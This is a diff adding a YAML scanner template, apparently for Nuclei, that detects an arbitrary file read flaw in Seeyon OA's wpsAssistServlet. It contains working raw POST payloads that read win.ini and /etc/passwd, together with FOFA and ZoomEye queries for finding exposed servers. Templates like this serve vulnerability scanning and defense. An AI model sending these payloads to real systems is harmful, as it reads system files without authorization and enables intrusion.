@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: or
+          dsl:
+            - status_code_1==200 && contains(body_1, 'bit app support') && contains(body_1, 'fonts') && contains(body_1, 'extensions')
+            - status_code_2==200 && regex('root:.*:0', body_2)
+          type: dsl
+      raw:
+        - |
+          POST /seeyon/wpsAssistServlet HTTP/1.1
+          Host: {{Hostname}}
+
+          flag=template&templateUrl=C:/windows/win.ini
+        - |
+          POST /seeyon/wpsAssistServlet HTTP/1.1
+          Host: {{Hostname}}
+
+          flag=template&templateUrl=/etc/passwd
+      stop-at-first-match: true
+id: seeyon-wpsassist-servlet-fileread
+info:
+    author: SleepingBag945
+    description: |-
+        FOFA: app="致远互联-OA" && title="V8.0SP2"
+        ZoomEye: app:"用友 致远OA"
+    name: 致远OA存在任意文件读取漏洞
+    severity: high
+    tags:
+        - seeyon
+        - fileread
+        - Servlet
+        - 致远互联-OA
+        - SAS
